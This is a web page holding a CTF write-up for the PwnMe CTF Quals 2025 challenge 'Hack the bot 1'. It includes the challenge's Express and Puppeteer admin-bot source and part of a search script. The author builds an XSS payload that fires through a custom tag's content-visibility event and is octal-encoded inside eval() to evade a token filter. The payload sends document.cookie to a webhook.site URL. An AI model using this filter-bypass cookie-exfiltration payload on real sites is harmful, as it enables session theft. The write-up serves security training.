<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M1.5 0h21l-1.91 21.563L11.977 24l-8.564-2.438L1.5 0zm7.031 9.75l-.232-2.718 10.059.003.23-2.622L5.412 4.41l.698 8.01h9.126l-.326 3.426-2.91.804-2.955-.81-.188-2.11H6.248l.33 4.171L12 19.351l5.379-1.443.744-8.157H8.531z"></path></svg> <!-- -->html<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token tag punctuation">&lt;</span><span class="token tag">vinh</span><span class="token tag"> </span><span class="token tag attr-name">oncontentvisibilityautostatechange</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">...</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag"> </span><span class="token tag special-attr attr-name">style</span><span class="token tag special-attr attr-value punctuation attr-equals">=</span><span class="token tag special-attr attr-value value css language-css property">display</span><span class="token tag special-attr attr-value value css language-css punctuation">:</span><span class="token tag special-attr attr-value value css language-css">block</span><span class="token tag special-attr attr-value value css language-css punctuation">;</span><span class="token tag special-attr attr-value value css language-css property">content-visibility</span><span class="token tag special-attr attr-value value css language-css punctuation">:</span><span class="token tag special-attr attr-value value css language-css">auto</span><span class="token tag punctuation">&gt;</span></code></pre></div></div>
<p>but our executed JS can&#x27;t contain any of the banned tokens, either. To be safe, we can use JS&#x27;s <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Deprecated_and_obsolete_features#escape_sequences">deprecated octal escape sequence</a> syntax to encode our payload as</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0V0zm22.034 18.276c-.175-1.095-.888-2.015-3.003-2.873-.736-.345-1.554-.585-1.797-1.14-.091-.33-.105-.51-.046-.705.15-.646.915-.84 1.515-.66.39.12.75.42.976.9 1.034-.676 1.034-.676 1.755-1.125-.27-.42-.404-.601-.586-.78-.63-.705-1.469-1.065-2.834-1.034l-.705.089c-.676.165-1.32.525-1.71 1.005-1.14 1.291-.811 3.541.569 4.471 1.365 1.02 3.361 1.244 3.616 2.205.24 1.17-.87 1.545-1.966 1.41-.811-.18-1.26-.586-1.755-1.336l-1.83 1.051c.21.48.45.689.81 1.109 1.74 1.756 6.09 1.666 6.871-1.004.029-.09.24-.705.074-1.65l.046.067zm-8.983-7.245h-2.248c0 1.938-.009 3.864-.009 5.805 0 1.232.063 2.363-.138 2.711-.33.689-1.18.601-1.566.48-.396-.196-.597-.466-.83-.855-.063-.105-.11-.196-.127-.196l-1.825 1.125c.305.63.75 1.172 1.324 1.517.855.51 2.004.675 3.207.405.783-.226 1.458-.691 1.811-1.411.51-.93.402-2.07.397-3.346.012-2.054 0-4.109 0-6.179l.004-.056z"></path></svg> <!-- -->js<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string template-punctuation string">`</span><span class="token template-string string">https://webhook.site/b7d64b9c-1be5-4c70-8120-fd9fb57cc68a?a=</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation dom variable">document</span><span class="token template-string interpolation punctuation">.</span><span class="token template-string interpolation property-access">cookie</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string template-punctuation string">`</span><span class="token punctuation">)</span></code></pre></div></div>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0V0zm22.034 18.276c-.175-1.095-.888-2.015-3.003-2.873-.736-.345-1.554-.585-1.797-1.14-.091-.33-.105-.51-.046-.705.15-.646.915-.84 1.515-.66.39.12.75.42.976.9 1.034-.676 1.034-.676 1.755-1.125-.27-.42-.404-.601-.586-.78-.63-.705-1.469-1.065-2.834-1.034l-.705.089c-.676.165-1.32.525-1.71 1.005-1.14 1.291-.811 3.541.569 4.471 1.365 1.02 3.361 1.244 3.616 2.205.24 1.17-.87 1.545-1.966 1.41-.811-.18-1.26-.586-1.755-1.336l-1.83 1.051c.21.48.45.689.81 1.109 1.74 1.756 6.09 1.666 6.871-1.004.029-.09.24-.705.074-1.65l.046.067zm-8.983-7.245h-2.248c0 1.938-.009 3.864-.009 5.805 0 1.232.063 2.363-.138 2.711-.33.689-1.18.601-1.566.48-.396-.196-.597-.466-.83-.855-.063-.105-.11-.196-.127-.196l-1.825 1.125c.305.63.75 1.172 1.324 1.517.855.51 2.004.675 3.207.405.783-.226 1.458-.691 1.811-1.411.51-.93.402-2.07.397-3.346.012-2.054 0-4.109 0-6.179l.004-.056z"></path></svg> <!-- -->js<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">&#x27;\146\145\164\143\150\50\140\150\164\164\160\163\72\57\57\167\145\142\150\157\157\153\56\163\151\164\145\57\142\67\144\66\64\142\71\143\55\61\142\145\65\55\64\143\67\60\55\70\61\62\60\55\146\144\71\146\142\65\67\143\143\66\70\141\77\141\75\44\173\144\157\143\165\155\145\156\164\56\143\157\157\153\151\145\175\140\51&#x27;</span><span class="token punctuation">)</span></code></pre></div></div>
<p>One final hiccup: looking at the bot source again,</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0V0zm22.034 18.276c-.175-1.095-.888-2.015-3.003-2.873-.736-.345-1.554-.585-1.797-1.14-.091-.33-.105-.51-.046-.705.15-.646.915-.84 1.515-.66.39.12.75.42.976.9 1.034-.676 1.034-.676 1.755-1.125-.27-.42-.404-.601-.586-.78-.63-.705-1.469-1.065-2.834-1.034l-.705.089c-.676.165-1.32.525-1.71 1.005-1.14 1.291-.811 3.541.569 4.471 1.365 1.02 3.361 1.244 3.616 2.205.24 1.17-.87 1.545-1.966 1.41-.811-.18-1.26-.586-1.755-1.336l-1.83 1.051c.21.48.45.689.81 1.109 1.74 1.756 6.09 1.666 6.871-1.004.029-.09.24-.705.074-1.65l.046.067zm-8.983-7.245h-2.248c0 1.938-.009 3.864-.009 5.805 0 1.232.063 2.363-.138 2.711-.33.689-1.18.601-1.566.48-.396-.196-.597-.466-.83-.855-.063-.105-.11-.196-.127-.196l-1.825 1.125c.305.63.75 1.172 1.324 1.517.855.51 2.004.675 3.207.405.783-.226 1.458-.691 1.811-1.411.51-.93.402-2.07.397-3.346.012-2.054 0-4.109 0-6.179l.004-.056z"></path></svg> <!-- -->js<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="">        </span><span class="token keyword">const</span><span class=""> page </span><span class="token operator">=</span><span class=""> </span><span class="token keyword control-flow">await</span><span class=""> browser</span><span class="token punctuation">.</span><span class="token method function property-access">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class="">        </span><span class="token keyword control-flow">await</span><span class=""> page</span><span class="token punctuation">.</span><span class="token method function property-access">goto</span><span class="token punctuation">(</span><span class="">url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">3</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class="">        </span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="">url</span><span class="token punctuation">.</span><span class="token method function property-access">startsWith</span><span class="token punctuation">(</span><span class="token string">&quot;http://localhost/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="">            </span><span class="token keyword control-flow">await</span><span class=""> page</span><span class="token punctuation">.</span><span class="token method function property-access">setCookie</span><span class="token punctuation">(</span><span class="">cookie</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="">        </span><span class="token punctuation">}</span></code></pre></div></div>
<p>the admin visits the page <em>before</em> setting its cookie. As a simple solution, we can just sleep for a bit before exfiltrating the cookie via XSS,</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0V0zm22.034 18.276c-.175-1.095-.888-2.015-3.003-2.873-.736-.345-1.554-.585-1.797-1.14-.091-.33-.105-.51-.046-.705.15-.646.915-.84 1.515-.66.39.12.75.42.976.9 1.034-.676 1.034-.676 1.755-1.125-.27-.42-.404-.601-.586-.78-.63-.705-1.469-1.065-2.834-1.034l-.705.089c-.676.165-1.32.525-1.71 1.005-1.14 1.291-.811 3.541.569 4.471 1.365 1.02 3.361 1.244 3.616 2.205.24 1.17-.87 1.545-1.966 1.41-.811-.18-1.26-.586-1.755-1.336l-1.83 1.051c.21.48.45.689.81 1.109 1.74 1.756 6.09 1.666 6.871-1.004.029-.09.24-.705.074-1.65l.046.067zm-8.983-7.245h-2.248c0 1.938-.009 3.864-.009 5.805 0 1.232.063 2.363-.138 2.711-.33.689-1.18.601-1.566.48-.396-.196-.597-.466-.83-.855-.063-.105-.11-.196-.127-.196l-1.825 1.125c.305.63.75 1.172 1.324 1.517.855.51 2.004.675 3.207.405.783-.226 1.458-.691 1.811-1.411.51-.93.402-2.07.397-3.346.012-2.054 0-4.109 0-6.179l.004-.056z"></path></svg> <!-- -->js<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token console class-name">console</span><span class="token punctuation">.</span><span class="token method function property-access">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token spread operator">...</span><span class="token string">&#x27;setTimeout(() =&gt; fetch(`https://webhook.site/b7d64b9c-1be5-4c70-8120-fd9fb57cc68a?a=${document.cookie}`), 3000)&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token method function property-access">map</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class=""> </span><span class="token arrow operator">=&gt;</span><span class=""> </span><span class="token string">&#x27;\\&#x27;</span><span class=""> </span><span class="token operator">+</span><span class=""> s</span><span class="token punctuation">.</span><span class="token method function property-access">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">toString</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">join</span><span class="token punctuation">(</span><span class="token string">&#x27;&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></div></div>
<p>giving us a final payload looking like</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M1.5 0h21l-1.91 21.563L11.977 24l-8.564-2.438L1.5 0zm7.031 9.75l-.232-2.718 10.059.003.23-2.622L5.412 4.41l.698 8.01h9.126l-.326 3.426-2.91.804-2.955-.81-.188-2.11H6.248l.33 4.171L12 19.351l5.379-1.443.744-8.157H8.531z"></path></svg> <!-- -->html<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token tag punctuation">&lt;</span><span class="token tag">vinh</span><span class="token tag"> </span><span class="token tag attr-name">oncontentvisibilityautostatechange</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">eval(&#x27;\163\145\164\124\151\155\145\157\165\164\50\50\51\40\75\76\40\146\145\164\143\150\50\140\150\164\164\160\163\72\57\57\167\145\142\150\157\157\153\56\163\151\164\145\57\142\67\144\66\64\142\71\143\55\61\142\145\65\55\64\143\67\60\55\70\61\62\60\55\146\144\71\146\142\65\67\143\143\66\70\141\77\141\75\44\173\144\157\143\165\155\145\156\164\56\143\157\157\153\151\145\175\140\51\54\40\63\60\60\60\51&#x27;)</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag"> </span><span class="token tag special-attr attr-name">style</span><span class="token tag special-attr attr-value punctuation attr-equals">=</span><span class="token tag special-attr attr-value value css language-css property">display</span><span class="token tag special-attr attr-value value css language-css punctuation">:</span><span class="token tag special-attr attr-value value css language-css">block</span><span class="token tag special-attr attr-value value css language-css punctuation">;</span><span class="token tag special-attr attr-value value css language-css property">content-visibility</span><span class="token tag special-attr attr-value value css language-css punctuation">:</span><span class="token tag special-attr attr-value value css language-css">auto</span><span class="token tag punctuation">&gt;</span></code></pre></div></div>
<p>Reporting this to the bot, we get the flag:</p>
<p><img src="https://gist.github.com/user-attachments/assets/cf486ec9-946e-4c53-b7ee-80f2c4efab81" alt="image"/></p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary">Code<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="">PWNME{D1d_y0U_S4iD-F1lt33Rs?}</span></code></pre></div></div></main></div><!--$--><!--/$--></main><script src="/_next/static/chunks/9563dab5ba30607d.js" id="_R_" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[39756,[\"/_next/static/chunks/ff1a16fafef87110.js\",\"/_next/static/chunks/d037381d3416c607.js\"],\"default\"]\n3:I[37457,[\"/_next/static/chunks/ff1a16fafef87110.js\",\"/_next/static/chunks/d037381d3416c607.js\"],\"default\"]\n4:I[22016,[\"/_next/static/chunks/44838f11011a9f2d.js\"],\"\"]\n6:I[97367,[\"/_next/static/chunks/ff1a16fafef87110.js\",\"/_next/static/chunks/d037381d3416c607.js\"],\"OutletBoundary\"]\n7:\"$Sreact.suspense\"\n9:I[97367,[\"/_next/static/chunks/ff1a16fafef87110.js\",\"/_next/static/chunks/d037381d3416c607.js\"],\"ViewportBoundary\"]\nb:I[97367,[\"/_next/static/chunks/ff1a16fafef87110.js\",\"/_next/static/chunks/d037381d3416c607.js\"],\"MetadataBoundary\"]\nd:I[68027,[\"/_next/static/chunks/ff1a16fafef87110.js\",\"/_next/static/chunks/d037381d3416c607.js\"],\"default\"]\n:HL[\"/_next/static/chunks/0ae28dad4c293945.css\",\"style\"]\n:HL[\"/_next/static/media/70bc3e132a0a741e-s.p.15008bfb.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/media/83afe278b6a6bb3c-s.p.3a6ba036.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"FqfWdJCztNJa3QVRETEoN\",\"c\":[\"\",\"writeups\",\"0d9af500fb0b9923022eaad055fc7b7c\"],\"q\":\"\",\"i\":false,\"f\":[[[\"\",{\"children\":[\"writeups\",{\"children\":[[\"id\",\"0d9af500fb0b9923022eaad055fc7b7c\",\"d\"],{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],[[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/chunks/0ae28dad4c293945.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"className\":\"dark scroll-smooth jetbrains_mono_cc80ae23-module__2tkX8G__variable\",\"children\":[[\"$\",\"head\",null,{\"children\":[\"$\",\"meta\",null,{\"charSet\":\"utf-8\"}]}],[\"$\",\"body\",null,{\"className\":\"text-dark dark:text-white dark:bg-midnight\",\"style\":{\"fontFamily\":\"'Inter', 'Inter Fallback'\",\"fontStyle\":\"normal\"},\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"div\",null,{\"className\":\"h-screen flex items-center justify-center\",\"children\":[\"$\",\"main\",null,{\"className\":\"relative pl-14\",\"children\":[[\"$\",\"svg\",null,{\"stroke\":\"currentColor\",\"fill\":\"currentColor\",\"strokeWidth\":\"0\",\"viewBox\":\"0 0 512 512\",\"className\":\"absolute left-0 top-2 text-5xl text-grapefruit\",\"children\":[\"$undefined\",[[\"$\",\"path\",\"0\",{\"d\":\"M256 48C140.559 48 48 140.559 48 256c0 115.436 92.559 208 208 208 115.435 0 208-92.564 208-208 0-115.441-92.564-208-208-208zm104.002 282.881l-29.12 29.117L256 285.117l-74.881 74.881-29.121-29.117L226.881 256l-74.883-74.881 29.121-29.116L256 226.881l74.881-74.878 29.12 29.116L285.119 256l74.883 74.881z\",\"children\":[]}]]],\"style\":{\"color\":\"$undefined\"},\"height\":\"1em\",\"width\":\"1em\",\"xmlns\":\"http://www.w3.org/2000/svg\"}],[\"$\",\"h1\",null,{\"className\":\"font-bold text-7xl underline decoration-grapefruit mb-5\",\"children\":\"404.\"}],[\"$\",\"p\",null,{\"children\":\"Your requested page was not found.\"}],[\"$\",\"$L4\",null,{\"href\":\"/\",\"className\":\"font-medium text-inherit\",\"children\":\"Return to home →\"}]]}]}],[]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]]}]]}],{\"children\":[[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"main\",null,{\"className\":\"container pt-20 pb-24\",\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]]}],{\"children\":[[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"script\",\"script-0\",{\"src\":\"/_next/static/chunks/44838f11011a9f2d.js\",\"async\":true,\"nonce\":\"$undefined\"}]],[[\"$\",\"$L4\",null,{\"href\":\"/writeups\",\"className\":\"text-secondary text-sm mb-10 -ml-5 block w-max\",\"children\":\"← Back to writeups\"}],[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]]}],{\"children\":[[\"$\",\"$1\",\"c\",{\"children\":[\"$L5\",[[\"$\",\"script\",\"script-0\",{\"src\":\"/_next/static/chunks/03f4569ba78edab9.js\",\"async\":true,\"nonce\":\"$undefined\"}],[\"$\",\"script\",\"script-1\",{\"src\":\"/_next/static/chunks/44f6ea3170f4e31a.js\",\"async\":true,\"nonce\":\"$undefined\"}],[\"$\",\"script\",\"script-2\",{\"src\":\"/_next/static/chunks/39b99946d2be6a43.js\",\"async\":true,\"nonce\":\"$undefined\"}],[\"$\",\"script\",\"script-3\",{\"src\":\"/_next/static/chunks/116d3b69f07f8eb7.js\",\"async\":true,\"nonce\":\"$undefined\"}]],[\"$\",\"$L6\",null,{\"children\":[\"$\",\"$7\",null,{\"name\":\"Next.MetadataOutlet\",\"children\":\"$@8\"}]}]]}],{},null,false,false]},null,false,false]},null,false,false]},null,false,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[\"$\",\"$L9\",null,{\"children\":\"$@a\"}],[\"$\",\"div\",null,{\"hidden\":true,\"children\":[\"$\",\"$Lb\",null,{\"children\":[\"$\",\"$7\",null,{\"name\":\"Next.Metadata\",\"children\":\"$@c\"}]}]}],[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\",\"content\":\"\"}]]}],false]],\"m\":\"$undefined\",\"G\":[\"$d\",[]],\"S\":true}\n"])</script><script>self.__next_f.push([1,"a:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\n"])</script><script>self.__next_f.push([1,"e:I[10453,[\"/_next/static/chunks/44838f11011a9f2d.js\",\"/_next/static/chunks/03f4569ba78edab9.js\",\"/_next/static/chunks/44f6ea3170f4e31a.js\",\"/_next/static/chunks/39b99946d2be6a43.js\",\"/_next/static/chunks/116d3b69f07f8eb7.js\"],\"default\"]\nf:T95e,"])</script><script>self.__next_f.push([1,"const express = require('express');\nconst path = require('path');\nconst fs = require('fs');\nconst { spawn } = require('child_process');\nconst puppeteer = require('puppeteer');\nconst { format } = require('date-fns');\n\nconst app = express();\nconst port = 5000;\n\nconst logPath = '/tmp/bot_folder/logs/';\nconst browserCachePath = '/tmp/bot_folder/browser_cache/';\n\nconst cookie = {\n    name: 'Flag',\n    value: \"PWNME{FAKE_FLAG}\",\n    sameSite: 'Strict'\n};\n\napp.use(express.urlencoded({ extended: true }));\n\napp.use(express.static(path.join(__dirname, 'public')));\n\napp.set('views', path.join(__dirname, 'views'));\napp.set('view engine', 'ejs');\n\nif (!fs.existsSync(logPath)) {\n    fs.mkdirSync(logPath, { recursive: true });\n}\n\nif (!fs.existsSync(browserCachePath)) {\n    fs.mkdirSync(browserCachePath, { recursive: true });\n}\n\nconst sleep = ms =\u003e new Promise(resolve =\u003e setTimeout(resolve, ms));\n\nasync function startBot(url, name) {\n    const logFilePath = path.join(logPath, `${name}.log`);\n\n    try {\n        const logStream = fs.createWriteStream(logFilePath, { flags: 'a' });\n        logStream.write(`${new Date()} : Attempting to open website ${url}\\n`);\n\n        const browser = await puppeteer.launch({\n            headless: 'new',\n            args: ['--remote-allow-origins=*','--no-sandbox', '--disable-dev-shm-usage', `--user-data-dir=${browserCachePath}`]\n        });\n\n        const page = await browser.newPage();\n        await page.goto(url);\n\n        if (url.startsWith(\"http://localhost/\")) {\n            await page.setCookie(cookie);\n        }\n\n        logStream.write(`${new Date()} : Successfully opened ${url}\\n`);\n        \n        await sleep(7000);\n        await browser.close();\n\n        logStream.write(`${new Date()} : Finished execution\\n`);\n        logStream.end();\n    } catch (e) {\n        const logStream = fs.createWriteStream(logFilePath, { flags: 'a' });\n        logStream.write(`${new Date()} : Exception occurred: ${e}\\n`);\n        logStream.end();\n    }\n}\n\napp.get('/', (req, res) =\u003e {\n    res.render('index');\n});\n\napp.get('/report', (req, res) =\u003e {\n    res.render('report');\n});\n\napp.post('/report', (req, res) =\u003e {\n    const url = req.body.url;\n    const name = format(new Date(), \"yyMMdd_HHmmss\");\n    startBot(url, name);\n    res.status(200).send(`logs/${name}.log`);\n});\n\napp.listen(port, () =\u003e {\n    console.log(`App running at http://0.0.0.0:${port}`);\n});"])</script><script>self.__next_f.push([1,"5:[\"$\",\"div\",null,{\"children\":[\"$\",\"main\",null,{\"className\":\"text-pretty max-w-5xl mx-auto text-sm [\u0026_h1]:text-5xl [\u0026_h1]:font-semibold [\u0026_h1]:mb-8 [\u0026_blockquote]:text-secondary [\u0026_blockquote]:space-y-3 [\u0026_blockquote]:border-l-4 [\u0026_blockquote]:border-secondary [\u0026_blockquote]:pl-5 [\u0026_blockquote]:mb-5 [\u0026\u003e_p]:my-4 [\u0026_img]:my-5 [\u0026_ul]:list-disc [\u0026_ul]:pl-6 [\u0026_ol]:list-decimal [\u0026_ol]:pl-6 [\u0026_img]:rounded [\u0026_li]:my-2\",\"children\":[[\"$\",\"h1\",\"h1-0\",{\"children\":\"PwnMe CTF Quals 2025 — Hack the bot 1\"}],\"\\n\",[\"$\",\"blockquote\",\"blockquote-0\",{\"children\":[\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":\"I've developed a little application to help me with my pentest missions, with lots of useful payloads! I even let users add new payloads, but since I was in a rush I didn't have time to test the security of my application, could you take care of it ?\"}],\"\\n\"]}],\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":\"We're given an express server that looks like this:\"}],\"\\n\",[\"$\",\"$Le\",\"pre-0\",{\"className\":\"my-2\",\"children\":\"$f\",\"language\":\"js\"}],\"\\n\",\"$L10\",\"\\n\",\"$L11\",\"\\n\",\"$L12\",\"\\n\",\"$L13\",\"\\n\",\"$L14\",\"\\n\",\"$L15\",\"\\n\",\"$L16\",\"\\n\",\"$L17\",\"\\n\",\"$L18\",\"\\n\",\"$L19\",\"\\n\",\"$L1a\",\"\\n\",\"$L1b\",\"\\n\",\"$L1c\",\"\\n\",\"$L1d\",\"\\n\",\"$L1e\",\"\\n\",\"$L1f\",\"\\n\",\"$L20\",\"\\n\",\"$L21\",\"\\n\",\"$L22\",\"\\n\",\"$L23\",\"\\n\",\"$L24\",\"\\n\",\"$L25\"]}]}]\n"])</script><script>self.__next_f.push([1,":HL[\"https://gist.github.com/user-attachments/assets/9d840a9b-e1df-4c45-90b5-e9fddd514ea0\",\"image\"]\n:HL[\"https://gist.github.com/user-attachments/assets/b74639aa-e387-4e0a-af9c-166eaee374f5\",\"image\"]\n:HL[\"https://gist.github.com/user-attachments/assets/cf486ec9-946e-4c53-b7ee-80f2c4efab81\",\"image\"]\n10:[\"$\",\"p\",\"p-1\",{\"children\":\"Seemingly, the server sets up a simple \\\"admin bot\\\" whose cookie we need to extract via XSS.\"}]\n11:[\"$\",\"p\",\"p-2\",{\"children\":[\"But where is the XSS vulnerability? Looking in the script loaded by \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"index.ejs\"}],\",\"]}]\n26:T7b4,"])</script><script>self.__next_f.push([1,"// Implements search functionality, filtering articles to display only those matching the search words (considering whole words case-insensitive matches)\n\nfunction getSearchQuery() {\n    const params = new URLSearchParams(window.location.search);\n    // Utiliser une valeur par défaut de chaîne vide si le paramètre n'existe pas\n    return params.get('q') ? params.get('q').toLowerCase() : '';\n}\n\ndocument.addEventListener('DOMContentLoaded', function() {\n    const searchQuery = getSearchQuery();\n    document.getElementById('search-input').value = searchQuery; \n    if (searchQuery) {\n        searchArticles(searchQuery);\n    }\n});\n\ndocument.getElementById('search-icon').addEventListener('click', function() {\n    searchArticles();\n});\n\ndocument.getElementById('search-input').addEventListener('keypress', function(event) {\n    if (event.key === 'Enter') {\n        searchArticles();\n    }\n});\n\nfunction searchArticles(searchInput = document.getElementById('search-input').value.toLowerCase().trim()) {\n    const searchWords = searchInput.split(/[^\\p{L}]+/u);\n    const articles = document.querySelectorAll('.article-box');\n    let found = false;\n    articles.forEach(article =\u003e {\n        if (searchInput === '') {\n            article.style.display = '';\n            found = true;\n        } else {\n            const articleText = article.textContent.toLowerCase();\n            const isMatch = 